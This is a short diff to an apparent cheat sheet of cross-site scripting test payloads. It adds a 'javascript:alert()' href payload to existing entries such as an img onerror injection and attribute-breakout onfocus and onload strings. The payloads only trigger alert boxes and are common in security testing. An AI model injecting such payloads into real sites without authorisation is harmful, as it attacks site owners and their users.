@@ -13,3 +13,4 @@
 1. `<img src=1 onerror=alert()>`
 2. `" onfocus="alert()`
 3. `onload="this.src+=<img src=1 onerror=alert()>`
+4. Anything put inside href use this payload `javascript:alert()`
